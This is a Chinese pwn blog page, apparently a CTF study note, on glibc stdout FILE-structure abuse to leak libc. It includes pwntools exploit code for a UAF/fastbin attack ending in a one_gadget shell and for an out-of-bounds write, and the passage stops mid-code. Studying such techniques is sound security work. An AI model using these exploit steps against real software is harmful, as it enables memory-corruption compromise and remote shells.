@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="1.利用stdout泄露libc 设置_flag &amp;~ _IO_NO_WRITES即_flag &amp;~ 0x8。 设置_flag &amp; _IO_CURRENTLY_PUTTING即_flag | 0x800 设置_fileno为1。 设置_IO_write_base指向想要泄露的地方；_IO_write_ptr指向泄露结束的地址。 设置_IO_read_end等于_IO_wr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IO">
+<meta property="og:url" content="http://example.com/2025/11/18/IO/index.html">
+<meta property="og:site_name" content="小小pwn">
+<meta property="og:description" content="1.利用stdout泄露libc 设置_flag &amp;~ _IO_NO_WRITES即_flag &amp;~ 0x8。 设置_flag &amp; _IO_CURRENTLY_PUTTING即_flag | 0x800 设置_fileno为1。 设置_IO_write_base指向想要泄露的地方；_IO_write_ptr指向泄露结束的地址。 设置_IO_read_end等于_IO_wr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1754547115898-652df905-3171-40f4-be4d-d9e02272534c.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1754547614309-b932fa2f-4cde-46bd-983b-ef3f7d7b8cd1.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1754547992628-e520b216-4779-4ad5-a284-93cd353de8d1.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1754548529026-b3229780-a730-46f2-9e96-a8f9cffe611d.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1754548869956-5f00fed4-ecfc-43b3-8c73-757f372f696b.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1754546302990-8925b85e-1d77-4a36-91ee-56b7c2340d0d.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1754546583048-fc4d30e8-bba9-4629-a551-08e7cac4fad5.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1754546649761-9cb83f94-8426-46c4-950a-de98fe7e36ec.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1754546775684-81f42a87-84ef-4d01-b8b6-8532ebfb1a90.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1754546990292-95e861ee-20cb-4e3c-ae83-fec4465f14c0.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1761139985999-f30b66a1-bc8c-4edf-a133-f72e948f4f08.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1756317776625-be280451-9e40-4314-844d-5f22477be507.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1756317788120-47fd1fd8-8373-489f-9b56-83f676e39e4a.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1756318696382-a2660f42-da02-4508-a89e-b47f07581bc0.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1756318720210-a1410223-3a0d-4c98-ac62-a84e8f5c228c.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1756318912707-dd71d112-1cd9-413a-a17b-4d391ed4b228.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1756367402001-75ea793f-036a-4125-9bed-8f1ddebb082e.jpeg">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1756626660579-1b6052a1-a9ea-4950-81c9-e5118efaaea9.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757332053371-c86312db-ff23-4f91-9e97-e5ce1087280a.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757484619981-c66360a3-783a-4b93-a0d1-d3ed9575e3a8.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757425507971-b25c787d-a50b-4337-a54a-ef2ae59e9977.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757430398318-32e1807d-a579-4bdc-9901-bfca0bfbe677.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757430524893-6c4c2ba4-24ce-4e2e-8a2c-fe862b95cd11.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757487139009-d1208a18-6c13-486b-8b0c-b8575a375f6c.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757939145635-0a23f733-f8fa-468e-a9e1-10472b590f03.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757486354064-108e5ed4-29ad-4860-8a85-cf4b5e2fce51.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757518127314-c993502c-881b-4c06-9b7e-93f7db083874.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757518150975-61d66abf-6fc8-4b62-9c12-e6322fc1b91d.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757517792150-b82c2e41-1537-440d-97ef-bd58c7ae40d1.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757517831988-8910f821-62b9-4292-b3c6-a85df2d96711.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757518150975-61d66abf-6fc8-4b62-9c12-e6322fc1b91d-1763442095814-63.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1757520030900-c1ae2be2-46fd-4eab-8f4c-5c15f837e957.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1758027109912-2eff58c6-920a-439d-a5c5-43447fd83f43.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1758027035874-7ca8ac7e-f05c-4538-8fc8-f6872dd5e005.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1758027875904-8077351a-94a9-4c80-9722-3cd55442bdec.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1758028173345-0e30afe6-b43b-4d36-96e0-4d705580a33d.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1758040085498-713e536f-00ba-42eb-9eef-eecf737c7c77.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1758116454435-582e9806-913b-4b85-bb1c-bec33c5c272a.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1758259333974-7187c268-c67d-40bf-9b91-108ce911012c.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1758259406367-6ef6d938-90ab-4a66-a72a-816bc8b36a77.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1758198996019-490a7149-94c5-4c9d-8f7a-0be28035b57d.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1758262312038-fa6f4825-cb6e-4895-aeca-f648d1b31df7.png">
+<meta property="og:image" content="http://example.com/2025/11/18/IO/1758262341349-de08b097-95d5-4905-880d-0596124baebb.png">
+<meta property="article:published_time" content="2025-11-18T04:57:04.000Z">
+<meta property="article:modified_time" content="2025-11-18T05:03:17.660Z">
+<meta property="article:author" content="和方煜">
+<meta property="article:tag" content="知识点">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/11/18/IO/1754547115898-652df905-3171-40f4-be4d-d9e02272534c.png">
+
+<link rel="canonical" href="http://example.com/2025/11/18/IO/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>IO | 小小pwn</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">小小pwn</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/IO/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          IO
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-11-18 12:57:04 / 修改时间：13:03:17" itemprop="dateCreated datePublished" datetime="2025-11-18T12:57:04+08:00">2025-11-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>30k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>27 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <hr>
+<h1 id="1-利用stdout泄露libc"><a href="#1-利用stdout泄露libc" class="headerlink" title="1.利用stdout泄露libc"></a>1.利用stdout泄露libc</h1><ol>
+<li>设置<code>_flag &amp;~ _IO_NO_WRITES</code>即<code>_flag &amp;~ 0x8</code>。</li>
+<li>设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>即<code>_flag | 0x800</code></li>
+<li>设置<code>_fileno</code>为1。</li>
+<li>设置<code>_IO_write_base</code>指向想要泄露的地方；<code>_IO_write_ptr</code>指向泄露结束的地址。</li>
+<li>设置<code>_IO_read_end</code>等于<code>_IO_write_base</code>或设置<code>_flag &amp; _IO_IS_APPENDING</code>即<code>_flag | 0x1000</code>。</li>
+<li>设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>（非必须）（fwrite）</li>
+</ol>
+<p>泄露libc 将结构体内容覆盖</p>
+<ul>
+<li>泄露 <code>_IO_file_jumps</code> 的写法：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+b<span class="string">&quot;\x58&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>泄露 <code>_IO_2_1_stdin_</code> 的写法：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad3887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>三个p64(0)为了覆盖 _IO_read_ptr、 _IO_read_end、 _IO_read_base，这几个没什么用所以直接覆盖0就行，最后 b’\x00’再把 _IO_write_base的最后一字节改成00，假设一开始_IO_write_base&#x3D;_IO_write_end&#x3D;0xffff,则此时_IO_write_base&#x3D;0xff00,再次调用puts或者write就会把0xff00-0xffff之间内容打出来，里面会有libc相关地址，也就达成了泄露目的。</p>
+<p>思路：想篡改stdout需要先拿到它的地址，通常是通过main_arena地址间接拿到stdout地址（爆破一字节）</p>
+<p>一个堆块在unsortbin与fastbin，这样他的fd就是main_arena+88，覆盖后面四个字节，但是倒数第四个需要爆破，fastbin attack就能实现申请到了</p>
+<h2 id="例题1-UAF-堆风水"><a href="#例题1-UAF-堆风水" class="headerlink" title="例题1 UAF 堆风水"></a>例题1 UAF 堆风水</h2><p><img src="/2025/11/18/IO/1754547115898-652df905-3171-40f4-be4d-d9e02272534c.png" alt="img"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">0</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">2</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">3</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,b<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+b<span class="string">&#x27;\x71&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+b<span class="string">&#x27;\xe1&#x27;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,b<span class="string">&#x27;\x70&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>只能创建0x60的堆块，UAF漏洞，堆风水具体如何实现</p>
+<p>代码就是这一部分</p>
+<p>为什么先free1，后free0，因为我们要改堆块1的size位位0xe1，这就需要先把堆块1往小地址改一点，通过这个假的堆块1，将真正的堆块1的size位改了，应为又uaf所以free了指针也不会被清零，具体实现</p>
+<p><img src="/2025/11/18/IO/1754547614309-b932fa2f-4cde-46bd-983b-ef3f7d7b8cd1.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(0,b&#x27;\x50&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>先free挂入链表，将堆块0的fd改为50，也就是将堆块1前一一点点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,4,p64(0)*9+b&#x27;\x71&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>这个其实就是堆块0，后入先出，伪造假堆块1的size位，我们看一下</p>
+<p><img src="/2025/11/18/IO/1754547992628-e520b216-4779-4ad5-a284-93cd353de8d1.png" alt="img"></p>
+<p>可以看到成功在50处伪造了size位，这时我们申请堆块5，就会申请到50那个地方（看bins）并且可以通过这个改真正堆块1的size位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,5,p64(0)*3+b&#x27;\xe1&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>![img]1754548159692-6e637918-479e-4585-9d6b-bccaaa2df6f1.png)</p>
+<p>可以看到该成功了</p>
+<p>然后</p>
+<p>free(1)</p>
+<p>free(0)</p>
+<p>free(2)</p>
+<p>这样堆块1就会进入unsortbin，堆块0，2进入fastbin，2-&gt;0</p>
+<p><img src="/2025/11/18/IO/1754548529026-b3229780-a730-46f2-9e96-a8f9cffe611d.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(2,b&#x27;\x70&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>然后修改堆块2的fd，将00，改成70，这样unsortbin就被挂入fastbin</p>
+<p><img src="/2025/11/18/IO/1754548869956-5f00fed4-ecfc-43b3-8c73-757f372f696b.png" alt="img"></p>
+<p>然后改一下堆块2fd &#x3D; main_arena+88后两字节，倒数第四位需要爆破一下，但是这个虽然被挂进去了，我们发现堆块2的size位还是0xe1，这样即使挂进去了也申请不出来，我们不能直接edit(2)</p>
+<p>应该</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(5,p64(0)*3+b&#x27;\x71&#x27;+b&#x27;\x00&#x27;*7+b&#x27;\xdd\x55&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>再往后申请三次就出来了，然后正常改结构就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,6,b&#x27;aaaa&#x27;)</span><br><span class="line">add(0x60,7,b&#x27;aaaa&#x27;)</span><br><span class="line">payload = b&#x27;\x00&#x27;*51+p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27; #studin</span><br><span class="line">add(0x60,8,payload)</span><br></pre></td></tr></table></figure>
+
+<p>再往后打malloc就行，这里又学到了一点，正常是需要realloc来调整栈的，但是直接触发double free就可以，不用调整</p>
+<p>完整代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">2</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">3</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x50&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;\x70&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x71&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xdd\x55&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"><span class="comment">#payload = b&#x27;\x00&#x27;*51+p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27; #studin</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">51</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&quot;\x58&quot;</span>   <span class="comment">#io file jmp</span></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,payload)</span><br><span class="line">buf= u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;buf = &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br><span class="line">bug()</span><br><span class="line">pause()</span><br><span class="line">libc_base = buf-<span class="number">0x3c5600</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">addr = libc_base +<span class="number">0x3c4aed</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(addr))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">shell = libc_base+<span class="number">0x4526a</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(shell)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,payload)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="例题2数组越界"><a href="#例题2数组越界" class="headerlink" title="例题2数组越界"></a>例题2数组越界</h2><p><img src="/2025/11/18/IO/1754546302990-8925b85e-1d77-4a36-91ee-56b7c2340d0d.png" alt="img"></p>
+<p>v1没有规定正，数组越界，通过二级指针可以改内容，就是改一个地址里面存了的一个地址，这个地址的内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">add(b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(b<span class="number">&#x27;b</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">add(b&#x27;</span>c<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">add(b&#x27;</span>d<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">bug()</span></span><br><span class="line"><span class="string">edit(b&#x27;</span><span class="number">-11</span><span class="string">&#x27;,b&#x27;</span>\x48<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">edit(b&#x27;</span><span class="number">-8</span><span class="string">&#x27;,p64(0xfbad1800)+p64(0)*3+b&#x27;</span>\x00<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">libc_ = get_address()</span></span><br><span class="line"><span class="string">print(hex(libc_))</span></span><br><span class="line"><span class="string">libc_base = libc_ - 0x1EB980-0x1000</span></span><br><span class="line"><span class="string">print(hex(libc_base))</span></span><br><span class="line"><span class="string">system_ = libc_base + libc.sym[&#x27;</span>system<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">print(&quot;system --&gt; &quot;+hex(system_))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">iolistall =  libc_base + libc.sym[&#x27;</span>_IO_list_all<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">print(&quot;IO_list_all --&gt; &quot;+hex(iolistall))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bin_sh=libc_base+next(libc.search(b&#x27;</span>/bin/sh<span class="string">&#x27;))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;</span>__free_hook<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">print(&quot;free_hook --&gt; &quot;+hex(free_hook))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">edit(b&#x27;</span><span class="number">-11</span><span 